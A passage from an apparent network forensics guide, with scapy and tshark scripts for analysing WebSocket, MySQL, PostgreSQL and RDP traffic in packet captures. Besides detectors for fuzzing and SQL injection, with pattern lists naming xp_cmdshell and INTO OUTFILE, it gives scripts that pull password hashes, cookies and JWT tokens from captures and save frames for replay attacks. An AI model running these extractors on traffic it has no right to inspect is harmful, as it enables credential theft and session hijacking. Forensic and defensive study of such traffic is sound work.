                    (r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b', 'Credit Card'),
                ]
                
                for pattern, data_type in sensitive_patterns:
                    matches = re.findall(pattern, payload, re.I)
                    if matches:
                        issues.append({
                            'type': 'Sensitive Data Exposure',
                            'severity': 'HIGH',
                            'description': f'{data_type} found in WebSocket traffic',
                            'data': matches[0][:50] if isinstance(matches[0], str) else matches[0]
                        })
                        print(f"[!] HIGH: {data_type} exposed in WebSocket message")
            
            except:
                pass
    
    # Summary
    print(f"\n[*] Security Analysis Summary:")
    print(f"[+] Total issues found: {len(issues)}\n")
    
    severity_counts = {}
    for issue in issues:
        severity = issue['severity']
        severity_counts[severity] = severity_counts.get(severity, 0) + 1
    
    for severity, count in sorted(severity_counts.items()):
        print(f"[{severity}]: {count} issues")
    
    return issues

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./websocket_security.py capture.pcap")
        sys.exit(1)
    
    issues = analyze_websocket_security(sys.argv[1])
```

### WebSocket Traffic Reconstruction

**Reconstruct conversation flow:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict

def reconstruct_websocket_conversations(pcap_file):
    pkts = rdpcap(pcap_file)
    
    # Group by connection (src_ip:src_port → dst_ip:dst_port)
    conversations = defaultdict(list)
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                src = f"{pkt[IP].src}:{pkt[TCP].sport}" if IP in pkt else 'unknown'
                dst = f"{pkt[IP].dst}:{pkt[TCP].dport}" if IP in pkt else 'unknown'
                
                # Create bidirectional connection key
                conn_key = tuple(sorted([src, dst]))
                
                # Try to extract WebSocket payload
                payload = pkt[Raw].load
                
                # Simple text extraction (assumes text frames)
                # [Inference] This is a simplified approach; proper frame parsing needed for production
                if len(payload) > 6:  # Minimum frame size
                    conversations[conn_key].append({
                        'time': float(pkt.time),
                        'from': src,
                        'to': dst,
                        'data': payload
                    })
            except:
                pass
    
    # Display conversations
    print("[*] WebSocket Conversations:\n")
    for i, (conn, messages) in enumerate(conversations.items(), 1):
        if len(messages) > 5:  # Filter out non-WebSocket connections
            print(f"[+] Conversation {i}: {conn[0]} ↔ {conn[1]}")
            print(f"    Messages: {len(messages)}")
            print(f"    Duration: {messages[-1]['time'] - messages[0]['time']:.2f} seconds")
            
            # Show sample messages
            print(f"    Sample messages:")
            for msg in messages[:5]:
                try:
                    text = msg['data'].decode('utf-8', errors='ignore')
                    if len(text) > 20 and text.isprintable():
                        print(f"      [{msg['time']}] {msg['from']} → {msg['to']}:")
                        print(f"        {text[:100]}")
                except:
                    pass
            print()
    
    return conversations

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./reconstruct_websocket.py capture.pcap")
        sys.exit(1)
    
    conversations = reconstruct_websocket_conversations(sys.argv[1])
```

### Advanced WebSocket Analysis

**Binary protocol analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *
import struct

def analyze_binary_websocket(pcap_file):
    """Analyze binary WebSocket protocols (e.g., Protocol Buffers, MessagePack)"""
    pkts = rdpcap(pcap_file)
    
    binary_frames = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load
            
            # Check for binary frame (opcode 2)
            if len(payload) > 2:
                opcode = payload[0] & 0x0F
                
                if opcode == 2:  # Binary frame
                    # Extract payload (simplified)
                    masked = (payload[1] >> 7) & 1
                    payload_len = payload[1] & 0x7F
                    offset = 2
                    
                    # Handle extended payload length
                    if payload_len == 126:
                        if len(payload) < 4:
                            continue
                        payload_len = struct.unpack('>H', payload[offset:offset+2])[0]
                        offset += 2
                    elif payload_len == 127:
                        if len(payload) < 10:
                            continue
                        payload_len = struct.unpack('>Q', payload[offset:offset+8])[0]
                        offset += 8
                    
                    # Handle masking
                    if masked:
                        if len(payload) < offset + 4:
                            continue
                        masking_key = payload[offset:offset+4]
                        offset += 4
                        
                        # Extract and unmask payload
                        if len(payload) >= offset + payload_len:
                            masked_payload = payload[offset:offset+payload_len]
                            unmasked = bytearray()
                            for i in range(len(masked_payload)):
                                unmasked.append(masked_payload[i] ^ masking_key[i % 4])
                            
                            binary_frames.append({
                                'time': float(pkt.time),
                                'src': pkt[IP].src if IP in pkt else 'unknown',
                                'data': bytes(unmasked)
                            })
                    else:
                        # Unmasked payload
                        if len(payload) >= offset + payload_len:
                            binary_payload = payload[offset:offset+payload_len]
                            binary_frames.append({
                                'time': float(pkt.time),
                                'src': pkt[IP].src if IP in pkt else 'unknown',
                                'data': binary_payload
                            })
    
    # Analyze binary data
    print(f"[*] Found {len(binary_frames)} binary WebSocket frames\n")
    
    for i, frame in enumerate(binary_frames[:10], 1):
        data = frame['data']
        print(f"[+] Frame {i} from {frame['src']}:")
        print(f"    Length: {len(data)} bytes")
        print(f"    Hex: {data[:32].hex()}")
        
        # Check for common binary formats
        
        # Protocol Buffers detection (heuristic)
        if any(b in data[:4] for b in [b'\x08', b'\x10', b'\x18', b'\x20']):
            print(f"    [*] Possible Protocol Buffers data")
        
        # MessagePack detection
        if data[0] in [0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f]:
            print(f"    [*] Possible MessagePack data")
            try:
                import msgpack
                decoded = msgpack.unpackb(data)
                print(f"    [+] MessagePack decoded: {decoded}")
            except:
                pass
        
        # CBOR detection
        if data[0] in range(0xa0, 0xbf) or data[0] in range(0x60, 0x7f):
            print(f"    [*] Possible CBOR data")
        
        # Check for common magic bytes
        if data.startswith(b'\x89PNG'):
            print(f"    [+] PNG image detected")
        elif data.startswith(b'\xff\xd8\xff'):
            print(f"    [+] JPEG image detected")
        elif data.startswith(b'GIF8'):
            print(f"    [+] GIF image detected")
        
        print()
    
    return binary_frames

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./binary_websocket.py capture.pcap")
        sys.exit(1)
    
    frames = analyze_binary_websocket(sys.argv[1])
```

### WebSocket Replay and Manipulation

**Extract WebSocket frames for replay:**

```python
#!/usr/bin/env python3
from scapy.all import *
import json

def extract_frames_for_replay(pcap_file):
    """Extract WebSocket frames in a format suitable for replay attacks"""
    pkts = rdpcap(pcap_file)
    
    frames = []
    handshake_info = None
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load
                text_payload = payload.decode('utf-8', errors='ignore')
                
                # Capture handshake information
                if 'Upgrade: websocket' in text_payload:
                    handshake_info = {
                        'url': None,
                        'origin': None,
                        'protocols': None,
                        'extensions': None
                    }
                    
                    # Extract URL
                    uri_match = re.search(r'GET\s+([^\s]+)', text_payload)
                    if uri_match:
                        handshake_info['url'] = uri_match.group(1)
                    
                    # Extract Origin
                    origin_match = re.search(r'Origin:\s*([^\r\n]+)', text_payload, re.I)
                    if origin_match:
                        handshake_info['origin'] = origin_match.group(1)
                    
                    # Extract Sec-WebSocket-Protocol
                    proto_match = re.search(r'Sec-WebSocket-Protocol:\s*([^\r\n]+)', text_payload, re.I)
                    if proto_match:
                        handshake_info['protocols'] = proto_match.group(1)
                    
                    print(f"[+] WebSocket Handshake Info:")
                    print(f"    URL: {handshake_info['url']}")
                    print(f"    Origin: {handshake_info['origin']}")
                    print()
                
                # Extract text frames (opcode 1)
                if len(payload) > 2:
                    opcode = payload[0] & 0x0F
                    if opcode == 1:  # Text frame
                        # Parse frame to extract payload
                        masked = (payload[1] >> 7) & 1
                        payload_len = payload[1] & 0x7F
                        offset = 2
                        
                        if payload_len == 126:
                            if len(payload) >= 4:
                                payload_len = struct.unpack('>H', payload[offset:offset+2])[0]
                                offset += 2
                        elif payload_len == 127:
                            if len(payload) >= 10:
                                payload_len = struct.unpack('>Q', payload[offset:offset+8])[0]
                                offset += 8
                        
                        if masked and len(payload) >= offset + 4:
                            masking_key = payload[offset:offset+4]
                            offset += 4
                            
                            if len(payload) >= offset + payload_len:
                                masked_data = payload[offset:offset+payload_len]
                                unmasked = bytearray()
                                for i in range(len(masked_data)):
                                    unmasked.append(masked_data[i] ^ masking_key[i % 4])
                                
                                text = bytes(unmasked).decode('utf-8', errors='ignore')
                                
                                frames.append({
                                    'time': float(pkt.time),
                                    'direction': 'client→server' if masked else 'server→client',
                                    'type': 'text',
                                    'payload': text
                                })
                                
                                print(f"[+] Frame: {text[:100]}")
            except:
                pass
    
    # Save frames for replay
    replay_data = {
        'handshake': handshake_info,
        'frames': frames
    }
    
    with open('websocket_replay.json', 'w') as f:
        json.dump(replay_data, f, indent=2)
    
    print(f"\n[*] Extracted {len(frames)} frames")
    print(f"[*] Replay data saved to websocket_replay.json")
    
    return replay_data

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./extract_for_replay.py capture.pcap")
        sys.exit(1)
    
    import struct
    import re
    data = extract_frames_for_replay(sys.argv[1])
```

### WebSocket Fuzzing Detection

**Detect fuzzing attempts:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import Counter
import statistics

def detect_websocket_fuzzing(pcap_file):
    """Detect potential fuzzing or automated testing on WebSocket connections"""
    pkts = rdpcap(pcap_file)
    
    # Track connection patterns
    connections = {}
    message_rates = []
    message_sizes = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                if IP in pkt:
                    conn_key = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
                    
                    if conn_key not in connections:
                        connections[conn_key] = {
                            'timestamps': [],
                            'sizes': [],
                            'payloads': []
                        }
                    
                    connections[conn_key]['timestamps'].append(float(pkt.time))
                    connections[conn_key]['sizes'].append(len(pkt[Raw].load))
                    connections[conn_key]['payloads'].append(pkt[Raw].load[:100])
            except:
                pass
    
    # Analyze each connection for fuzzing indicators
    print("[*] WebSocket Fuzzing Detection:\n")
    
    for conn, data in connections.items():
        if len(data['timestamps']) < 10:
            continue
        
        print(f"[+] Analyzing connection: {conn[0]}:{conn[1]} → {conn[2]}:{conn[3]}")
        
        # Calculate message rate
        if len(data['timestamps']) > 1:
            time_deltas = [data['timestamps'][i+1] - data['timestamps'][i] 
                          for i in range(len(data['timestamps'])-1)]
            avg_delta = statistics.mean(time_deltas)
            std_delta = statistics.stdev(time_deltas) if len(time_deltas) > 1 else 0
            
            # High-frequency messages with low variance = potential fuzzing
            if avg_delta < 0.1 and std_delta < 0.05:
                print(f"    [!] SUSPICIOUS: High-frequency regular messages")
                print(f"        Average interval: {avg_delta:.4f}s")
                print(f"        Std deviation: {std_delta:.4f}s")
        
        # Analyze message sizes
        size_counter = Counter(data['sizes'])
        unique_sizes = len(size_counter)
        total_messages = len(data['sizes'])
        
        # Many different message sizes = potential fuzzing
        if unique_sizes > total_messages * 0.8:
            print(f"    [!] SUSPICIOUS: High variation in message sizes")
            print(f"        Unique sizes: {unique_sizes}/{total_messages}")
        
        # Check for sequential/incremental patterns
        if len(data['sizes']) > 5:
            size_diffs = [data['sizes'][i+1] - data['sizes'][i] 
                         for i in range(len(data['sizes'])-1)]
            
            # Sequential size increments
            if all(d == 1 for d in size_diffs[:10]):
                print(f"    [!] SUSPICIOUS: Sequential message size increments")
        
        # Check for repeated patterns (signature of automated tools)
        payload_counter = Counter(data['payloads'])
        if len(payload_counter) < len(data['payloads']) * 0.3:
            print(f"    [!] SUSPICIOUS: High message repetition")
            print(f"        Unique payloads: {len(payload_counter)}/{len(data['payloads'])}")
        
        # Check for malformed frames
        malformed_count = 0
        for payload in data['payloads']:
            if len(payload) < 2:
                continue
            opcode = payload[0] & 0x0F
            if opcode > 10 or opcode in [3, 4, 5, 6, 7]:  # Reserved opcodes
                malformed_count += 1
        
        if malformed_count > 0:
            print(f"    [!] SUSPICIOUS: Malformed/invalid frames detected")
            print(f"        Count: {malformed_count}/{len(data['payloads'])}")
        
        print()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./detect_fuzzing.py capture.pcap")
        sys.exit(1)
    
    detect_websocket_fuzzing(sys.argv[1])
```

### Complete Application Layer Analysis Workflow

**Comprehensive analysis script:**

```python
#!/usr/bin/env python3
from scapy.all import *
import json
import re
from collections import defaultdict

def comprehensive_app_analysis(pcap_file):
    """Complete application layer analysis workflow"""
    
    print("="*70)
    print("COMPREHENSIVE APPLICATION LAYER ANALYSIS")
    print("="*70)
    
    pkts = rdpcap(pcap_file)
    
    # Statistics
    stats = {
        'http_requests': 0,
        'http_responses': 0,
        'websocket_handshakes': 0,
        'websocket_messages': 0,
        'json_payloads': 0,
        'xml_payloads': 0,
        'credentials_found': 0,
        'api_endpoints': set(),
        'cookies': set(),
        'tokens': set()
    }
    
    # Process packets
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load
                text_payload = payload.decode('utf-8', errors='ignore')
                
                # HTTP Analysis
                if text_payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'PATCH ')):
                    stats['http_requests'] += 1
                    
                    # Extract API endpoints
                    uri_match = re.search(r'(GET|POST|PUT|DELETE|PATCH)\s+([^\s]+)', text_payload)
                    if uri_match:
                        uri = uri_match.group(2)
                        if '/api/' in uri or re.search(r'/v\d+/', uri):
                            stats['api_endpoints'].add(uri)
                    
                    # Extract credentials
                    if 'Authorization:' in text_payload:
                        stats['credentials_found'] += 1
                    
                    # Extract cookies
                    cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', text_payload)
                    if cookie_match:
                        stats['cookies'].add(cookie_match.group(1)[:100])
                
                elif text_payload.startswith('HTTP/'):
                    stats['http_responses'] += 1
                
                # WebSocket Analysis
                if 'Upgrade: websocket' in text_payload or 'upgrade: websocket' in text_payload:
                    stats['websocket_handshakes'] += 1
                elif len(payload) > 2:
                    opcode = payload[0] & 0x0F
                    if opcode in [1, 2]:  # Text or binary frame
                        stats['websocket_messages'] += 1
                
                # JSON Detection
                if 'application/json' in text_payload or ('{' in text_payload and '"' in text_payload):
                    if '\r\n\r\n' in text_payload:
                        body = text_payload.split('\r\n\r\n', 1)[1]
                        if body.strip().startswith('{'):
                            stats['json_payloads'] += 1
                
                # XML Detection
                if 'application/xml' in text_payload or 'text/xml' in text_payload:
                    stats['xml_payloads'] += 1
                
                # Token extraction
                jwt_tokens = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', text_payload)
                stats['tokens'].update(jwt_tokens)
            
            except:
                pass
    
    # Report
    print("\n[*] TRAFFIC SUMMARY:")
    print(f"    Total packets: {len(pkts)}")
    print(f"    HTTP requests: {stats['http_requests']}")
    print(f"    HTTP responses: {stats['http_responses']}")
    print(f"    WebSocket handshakes: {stats['websocket_handshakes']}")
    print(f"    WebSocket messages: {stats['websocket_messages']}")
    print(f"    JSON payloads: {stats['json_payloads']}")
    print(f"    XML payloads: {stats['xml_payloads']}")
    
    print("\n[*] SECURITY FINDINGS:")
    print(f"    Credentials found: {stats['credentials_found']}")
    print(f"    Unique cookies: {len(stats['cookies'])}")
    print(f"    JWT tokens: {len(stats['tokens'])}")
    print(f"    API endpoints: {len(stats['api_endpoints'])}")
    
    if stats['api_endpoints']:
        print("\n[*] API ENDPOINTS:")
        for endpoint in sorted(list(stats['api_endpoints']))[:10]:
            print(f"    - {endpoint}")
    
    if stats['tokens']:
        print("\n[*] JWT TOKENS FOUND:")
        for token in list(stats['tokens'])[:3]:
            print(f"    - {token[:80]}...")
    
    print("\n" + "="*70)
    
    return stats

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./comprehensive_analysis.py capture.pcap")
        sys.exit(1)
    
    results = comprehensive_app_analysis(sys.argv[1])
```

---

### Important Related Topics

- **HTTP/2 and HTTP/3 analysis:** Binary framing, QUIC protocol inspection
- **gRPC traffic analysis:** Protocol Buffers over HTTP/2
- **Server-Sent Events (SSE):** Unidirectional streaming analysis
- **MQTT protocol analysis:** IoT message queue telemetry
- **GraphQL introspection attacks:** Schema enumeration via introspection queries
- **API rate limiting detection:** Identifying throttling and quota mechanisms
- **OAuth 2.0 flow analysis:** Authorization code, implicit, and client credentials flows

---

## Database Protocol Analysis (MySQL, PostgreSQL)

### MySQL Protocol Analysis

**MySQL Protocol Overview**

MySQL uses a client-server protocol over TCP, typically on port 3306. The protocol consists of packets with a header (4 bytes) followed by payload data.

**Wireshark MySQL Filtering**

```bash
# Basic MySQL traffic isolation
tshark -r capture.pcap -Y "mysql" -w mysql_traffic.pcap

# MySQL handshake packets
tshark -r capture.pcap -Y "mysql.greeting"

# Query packets
tshark -r capture.pcap -Y "mysql.query"

# Response packets
tshark -r capture.pcap -Y "mysql.response"

# Authentication attempts
tshark -r capture.pcap -Y "mysql.login_request"

# Extract MySQL queries
tshark -r capture.pcap -Y "mysql.query" -T fields -e mysql.query

# Show all MySQL fields
tshark -r capture.pcap -Y "mysql" -O mysql

# Filter by specific database
tshark -r capture.pcap -Y "mysql.schema"

# Error responses
tshark -r capture.pcap -Y "mysql.response_code != 0"
```

**MySQL Connection Handshake Analysis**

```bash
# Extract handshake sequence
tshark -r capture.pcap -Y "mysql.greeting || mysql.login_request" \
  -T fields -e frame.number -e frame.time -e ip.src -e ip.dst \
  -e mysql.server_greeting -e mysql.caps.client -e mysql.user

# Server capabilities
tshark -r capture.pcap -Y "mysql.greeting" \
  -T fields -e mysql.server_version -e mysql.caps.server

# Client capabilities
tshark -r capture.pcap -Y "mysql.login_request" \
  -T fields -e mysql.caps.client -e mysql.collation

# SSL/TLS capability detection
tshark -r capture.pcap -Y "mysql.caps.sl == 1"
```

**Query Extraction and Analysis**

```bash
# Extract all SQL queries with timestamps
tshark -r capture.pcap -Y "mysql.query" \
  -T fields -e frame.time -e ip.src -e mysql.query \
  -E header=y -E separator='|' > mysql_queries.log

# Filter specific query types
tshark -r capture.pcap -Y "mysql.query contains \"SELECT\"" \
  -T fields -e mysql.query

tshark -r capture.pcap -Y "mysql.query contains \"INSERT\"" \
  -T fields -e mysql.query

tshark -r capture.pcap -Y "mysql.query contains \"UPDATE\"" \
  -T fields -e mysql.query

tshark -r capture.pcap -Y "mysql.query contains \"DELETE\"" \
  -T fields -e mysql.query

# Dangerous queries (DROP, TRUNCATE)
tshark -r capture.pcap -Y "mysql.query matches \"(?i)(DROP|TRUNCATE)\"" \
  -T fields -e frame.time -e mysql.query

# SQL injection attempts
tshark -r capture.pcap -Y "mysql.query matches \"(?i)(UNION|OR 1=1|' OR)\"" \
  -T fields -e frame.time -e ip.src -e mysql.query
```

**Python MySQL Protocol Analysis**

```python
from scapy.all import *
import re

def analyze_mysql_traffic(pcap_file):
    """
    Analyze MySQL traffic from PCAP
    """
    packets = rdpcap(pcap_file)
    
    queries = []
    credentials = []
    databases = []
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            
            # MySQL packet starts with length (3 bytes) + sequence (1 byte)
            if len(payload) >= 5:
                # Query command (COM_QUERY = 0x03)
                if payload[4:5] == b'\x03':
                    try:
                        query = payload[5:].decode('utf-8', errors='ignore')
                        queries.append({
                            'time': pkt.time,
                            'src': pkt[IP].src,
                            'query': query.strip()
                        })
                    except:
                        pass
                
                # Login request packet
                if b'mysql_native_password' in payload:
                    try:
                        # Extract username (null-terminated string after capabilities)
                        username_match = re.search(b'([a-zA-Z0-9_]+)\x00', payload)
                        if username_match:
                            credentials.append({
                                'time': pkt.time,
                                'src': pkt[IP].src,
                                'username': username_match.group(1).decode()
                            })
                    except:
                        pass
                
                # Database selection (COM_INIT_DB = 0x02)
                if payload[4:5] == b'\x02':
                    try:
                        db_name = payload[5:].decode('utf-8', errors='ignore').strip('\x00')
                        databases.append({
                            'time': pkt.time,
                            'database': db_name
                        })
                    except:
                        pass
    
    return {
        'queries': queries,
        'credentials': credentials,
        'databases': databases
    }

# Usage
result = analyze_mysql_traffic('capture.pcap')

print(f"Found {len(result['queries'])} queries")
print(f"Found {len(result['credentials'])} credential attempts")
print(f"Found {len(result['databases'])} database selections")

# Print interesting queries
for q in result['queries']:
    if any(keyword in q['query'].upper() for keyword in ['DROP', 'DELETE', 'UPDATE']):
        print(f"[{q['time']}] {q['src']}: {q['query'][:100]}")
```

**MySQL Password Hash Extraction**

```bash
# MySQL authentication uses scrambled passwords
# Extract authentication packets
tshark -r capture.pcap -Y "mysql.login_request" -x | \
  grep -A 50 "mysql.login"

# Python script to extract password hashes
cat > extract_mysql_auth.py << 'EOF'
from scapy.all import *
import struct

def extract_mysql_auth(pcap_file):
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            
            # Look for login request packet
            if b'mysql_native_password' in payload:
                print(f"Authentication attempt from {pkt[IP].src}")
                
                # Parse capabilities (4 bytes)
                if len(payload) >= 32:
                    caps = struct.unpack('<I', payload[0:4])[0]
                    max_packet = struct.unpack('<I', payload[4:8])[0]
                    
                    # Find username (null-terminated)
                    username_start = 32
                    username_end = payload.find(b'\x00', username_start)
                    if username_end > username_start:
                        username = payload[username_start:username_end].decode()
                        print(f"  Username: {username}")
                        
                        # Password hash follows (if present)
                        hash_len_pos = username_end + 1
                        if hash_len_pos < len(payload):
                            hash_len = payload[hash_len_pos]
                            if hash_len > 0:
                                hash_data = payload[hash_len_pos+1:hash_len_pos+1+hash_len]
                                print(f"  Password hash: {hash_data.hex()}")

extract_mysql_auth('capture.pcap')
EOF

python3 extract_mysql_auth.py
```

**MySQL Result Set Analysis**

```bash
# Extract result sets (responses to SELECT queries)
tshark -r capture.pcap -Y "mysql.num_fields" \
  -T fields -e mysql.num_fields -e mysql.field.name

# Large result sets (potential data exfiltration)
tshark -r capture.pcap -Y "mysql && tcp.len > 10000" \
  -T fields -e frame.time -e ip.src -e tcp.len

# Row data extraction
tshark -r capture.pcap -Y "mysql.row" -T fields -e mysql.row
```

### PostgreSQL Protocol Analysis

**PostgreSQL Protocol Overview**

PostgreSQL uses its own wire protocol over TCP, typically on port 5432. The protocol consists of message types identified by a single character.

**Wireshark PostgreSQL Filtering**

```bash
# Basic PostgreSQL traffic
tshark -r capture.pcap -Y "pgsql" -w pgsql_traffic.pcap

# Startup messages
tshark -r capture.pcap -Y "pgsql.type == 'Startup'"

# Authentication
tshark -r capture.pcap -Y "pgsql.type == 'Authentication'"

# Query messages (Q type)
tshark -r capture.pcap -Y "pgsql.type == 'Q'"

# Parse messages (P type - prepared statements)
tshark -r capture.pcap -Y "pgsql.type == 'P'"

# Error responses
tshark -r capture.pcap -Y "pgsql.severity == 'ERROR'"

# Extract queries
tshark -r capture.pcap -Y "pgsql.query" -T fields -e pgsql.query

# Extract query parameters
tshark -r capture.pcap -Y "pgsql.type == 'B'" \
  -T fields -e pgsql.parameter

# Show full protocol details
tshark -r capture.pcap -Y "pgsql" -O pgsql
```

**PostgreSQL Connection Analysis**

```bash
# Startup packet details
tshark -r capture.pcap -Y "pgsql.type == 'Startup'" \
  -T fields -e frame.time -e ip.src -e pgsql.parameter.name \
  -e pgsql.parameter.value

# Authentication methods
tshark -r capture.pcap -Y "pgsql.type == 'Authentication'" \
  -T fields -e pgsql.authtype

# MD5 authentication challenges
tshark -r capture.pcap -Y "pgsql.authtype == 5" \
  -T fields -e pgsql.salt

# SSL/TLS negotiation
tshark -r capture.pcap -Y "pgsql.ssl_request"
```

**Query Extraction**

```bash
# Extract all queries with context
tshark -r capture.pcap -Y "pgsql.query" \
  -T fields -e frame.time -e ip.src -e pgsql.query \
  -E header=y -E separator='|' > pgsql_queries.log

# Prepared statement names
tshark -r capture.pcap -Y "pgsql.type == 'P'" \
  -T fields -e pgsql.statement

# Portal operations
tshark -r capture.pcap -Y "pgsql.type == 'B'" \
  -T fields -e pgsql.portal

# Transaction control
tshark -r capture.pcap -Y "pgsql.query matches \"(?i)(BEGIN|COMMIT|ROLLBACK)\"" \
  -T fields -e frame.time -e pgsql.query
```

**Python PostgreSQL Analysis**

```python
from scapy.all import *
import struct

def analyze_pgsql_traffic(pcap_file):
    """
    Analyze PostgreSQL traffic
    """
    packets = rdpcap(pcap_file)
    
    results = {
        'queries': [],
        'auth_attempts': [],
        'errors': [],
        'databases': []
    }
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            
            if len(payload) < 5:
                continue
            
            # Message format: Type (1 byte) + Length (4 bytes) + Data
            msg_type = chr(payload[0]) if payload[0] < 128 else None
            
            if msg_type == 'Q':  # Simple query
                try:
                    msg_len = struct.unpack('!I', payload[1:5])[0]
                    query = payload[5:5+msg_len-4].decode('utf-8', errors='ignore').strip('\x00')
                    results['queries'].append({
                        'time': pkt.time,
                        'src': pkt[IP].src,
                        'query': query
                    })
                except:
                    pass
            
            elif msg_type == 'E':  # Error response
                try:
                    msg_len = struct.unpack('!I', payload[1:5])[0]
                    error_data = payload[5:5+msg_len-4]
                    # Parse error fields (field_type + string + \x00)
                    error_msg = error_data.decode('utf-8', errors='ignore')
                    results['errors'].append({
                        'time': pkt.time,
                        'error': error_msg
                    })
                except:
                    pass
            
            # Startup message (no type byte, starts with length)
            elif len(payload) >= 8:
                try:
                    length = struct.unpack('!I', payload[0:4])[0]
                    protocol = struct.unpack('!I', payload[4:8])[0]
                    
                    # Protocol version 3.0 = 196608 (0x00030000)
                    if protocol == 196608:
                        # Parse parameters (name\x00value\x00...)
                        params = payload[8:].decode('utf-8', errors='ignore').split('\x00')
                        param_dict = {}
                        for i in range(0, len(params)-1, 2):
                            if i+1 < len(params):
                                param_dict[params[i]] = params[i+1]
                        
                        results['auth_attempts'].append({
                            'time': pkt.time,
                            'src': pkt[IP].src,
                            'user': param_dict.get('user', ''),
                            'database': param_dict.get('database', ''),
                            'application': param_dict.get('application_name', '')
                        })
                except:
                    pass
    
    return results

# Usage
result = analyze_pgsql_traffic('capture.pcap')

print(f"Queries: {len(result['queries'])}")
print(f"Auth attempts: {len(result['auth_attempts'])}")
print(f"Errors: {len(result['errors'])}")

# Display authentication attempts
for auth in result['auth_attempts']:
    print(f"[{auth['time']}] {auth['src']} -> User: {auth['user']}, DB: {auth['database']}")

# Display dangerous queries
dangerous_keywords = ['DROP', 'DELETE', 'TRUNCATE', 'ALTER']
for q in result['queries']:
    if any(kw in q['query'].upper() for kw in dangerous_keywords):
        print(f"[DANGEROUS] {q['query'][:100]}")
```

**PostgreSQL COPY Command Analysis**

```bash
# COPY command used for bulk data transfer
tshark -r capture.pcap -Y "pgsql.query matches \"(?i)COPY\"" \
  -T fields -e frame.time -e pgsql.query

# CopyData messages (data being transferred)
tshark -r capture.pcap -Y "pgsql.type == 'd'" \
  -T fields -e frame.time -e tcp.len

# Large data transfers (potential exfiltration)
tshark -r capture.pcap -Y "pgsql.type == 'd' && tcp.len > 10000" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.len
```

**Database Credential Extraction**

```bash
# Extract connection strings and credentials
tshark -r capture.pcap -Y "pgsql.parameter.name == \"user\"" \
  -T fields -e pgsql.parameter.value

tshark -r capture.pcap -Y "pgsql.parameter.name == \"database\"" \
  -T fields -e pgsql.parameter.value

# MD5 password hashes (if using MD5 auth)
tshark -r capture.pcap -Y "pgsql.password" \
  -T fields -e pgsql.password
```

### Database Attack Detection

**SQL Injection Detection**

```bash
# Common SQL injection patterns
tshark -r capture.pcap -Y "mysql.query || pgsql.query" \
  -T fields -e mysql.query -e pgsql.query | \
  grep -iE "(UNION|OR 1=1|' OR|\"--|\\'|\"|;--|xp_cmdshell)"

# Python script for advanced detection
cat > detect_sqli.py << 'EOF'
from scapy.all import *
import re

sqli_patterns = [
    r"(?i)(\bUNION\b.*\bSELECT\b)",
    r"(?i)(\bOR\b\s+\d+\s*=\s*\d+)",
    r"(?i)(\bAND\b\s+\d+\s*=\s*\d+)",
    r"'.*--",
    r"(?i)(exec\s*\(|execute\s*\()",
    r"(?i)(xp_cmdshell|sp_executesql)",
    r"(?i)(WAITFOR\s+DELAY)",
    r"(?i)(LOAD_FILE|INTO\s+OUTFILE)",
    r"[\'\"][\s]*(OR|AND)[\s]*[\'\"]",
]

def detect_sql_injection(pcap_file):
    packets = rdpcap(pcap_file)
    detections = []
    
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load).decode('utf-8', errors='ignore')
            
            for pattern in sqli_patterns:
                if re.search(pattern, payload):
                    detections.append({
                        'time': pkt.time,
                        'src': pkt[IP].src if pkt.haslayer(IP) else 'Unknown',
                        'pattern': pattern,
                        'payload': payload[:200]
                    })
                    break
    
    return detections

detections = detect_sql_injection('capture.pcap')
for d in detections:
    print(f"[{d['time']}] SQLi from {d['src']}")
    print(f"  Pattern: {d['pattern']}")
    print(f"  Payload: {d['payload']}\n")
EOF

python3 detect_sqli.py
```

**Privilege Escalation Detection**

```bash
# MySQL privilege changes
tshark -r capture.pcap -Y "mysql.query matches \"(?i)GRANT\"" \
  -T fields -e frame.time -e mysql.query

# PostgreSQL role manipulation
tshark -r capture.pcap -Y "pgsql.query matches \"(?i)(CREATE ROLE|ALTER ROLE|GRANT)\"" \
  -T fields -e frame.time -e pgsql.query

# Access to sensitive tables
tshark -r capture.pcap -Y "mysql.query matches \"(?i)(mysql\\.user|information_schema)\"" \
  -T fields -e frame.time -e ip.src -e mysql.query
```

---

## RDP Traffic Analysis

### RDP Protocol Overview

RDP (Remote Desktop Protocol) operates over TCP port 3389. The protocol has multiple layers including X.224 connection negotiation, TLS encryption, and the RDP protocol itself.

**Basic RDP Traffic Filtering**

```bash
# RDP traffic on standard port
tshark -r capture.pcap -Y "tcp.port == 3389" -w rdp_traffic.pcap

# RDP Cookie (username in connection)
